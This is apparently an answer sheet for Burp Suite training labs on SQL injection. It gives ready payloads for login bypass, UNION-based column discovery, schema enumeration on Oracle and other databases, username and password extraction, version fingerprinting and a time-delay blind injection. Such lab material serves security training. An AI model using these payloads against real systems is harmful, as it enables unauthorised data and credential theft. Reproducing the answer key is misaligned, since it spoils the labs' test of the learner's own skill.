# Burpsuite Lab Answers
## SQL injection 
### 1) SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#### Solution: '+OR+1=1--
![](sql_image/SQL-1.png)

--------------------------------

### 2) SQL injection vulnerability allowing login bypass
#### Solution: administrator'--
![](sql_image/SQL-2.png)

--------------------------------

### 3) SQL injection UNION attack, determining the number of columns returned by the query
#### Solution: 'UNION SELECT NULL, NULL, NULL--
![](sql_image/SQL-3.png)

--------------------------------

### 4) SQL injection UNION attack, finding a column containing text
#### Solution: 'UNION SELECT NULL,'HELLO BUDDY',NULL--
![](sql_image/SQL-4.png)

--------------------------------

### 5) SQL injection UNION attack, retrieving data from other tables
#### Solution: 'UNION SELECT username, password FROM users--
![](sql_image/SQL-5a.png)
![](sql_image/SQL-5b.png)

--------------------------------

### 6) SQL injection UNION attack, retrieving multiple values in a single column
#### Solution: 'UNION SELECT NULL,username||'~'||password FROM users--
![](sql_image/SQL-6.png)

--------------------------------

### 7) SQL injection attack, querying the database type and version on Oracle
#### Solution: 'UNION SELECT BANNER, NULL FROM v$version--
![](sql_image/SQL-7.png)

--------------------------------

### 8) SQL injection attack, querying the database type and version on MySQL and Microsoft
#### Solution: 'UNION SELECT @@version, NULL#
![](sql_image/SQL-8.png)

--------------------------------

### 9) SQL injection attack, listing the database contents on non-Oracle databases
#### Solution: Step-1 : '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
![](sql_image/SQL-9a.png)
#### Solution: Step-2 : '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qrktla'--
![](sql_image/SQL-9b.png)
#### Solution: Step-3 : '+UNION+SELECT+username_gwlqzm,+password_ikxmsh+FROM+users_qrktla-
![](sql_image/SQL-9c.png)

--------------------------------

### 10) SQL injection attack, listing the database contents on Oracle
#### Solution: Step-1 : '+UNION+SELECT+table_name,NULL+FROM+all_tables--
![](sql_image/SQL-10a.png)
#### Solution: Step-2 : '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KNHGDL'--
![](sql_image/SQL-10b.png)
#### Solution: Step-3 : '+UNION+SELECT+USERNAME_XEIEJW,+PASSWORD_UHIKUI+FROM+USERS_KNHGDL--
![](sql_image/SQL-10c.png)

--------------------------------

### 13) Blind SQL injection with time delays
#### Solution: TrackingId=x'||pg_sleep(10)--
![](sql_image/SQL-13a.png)
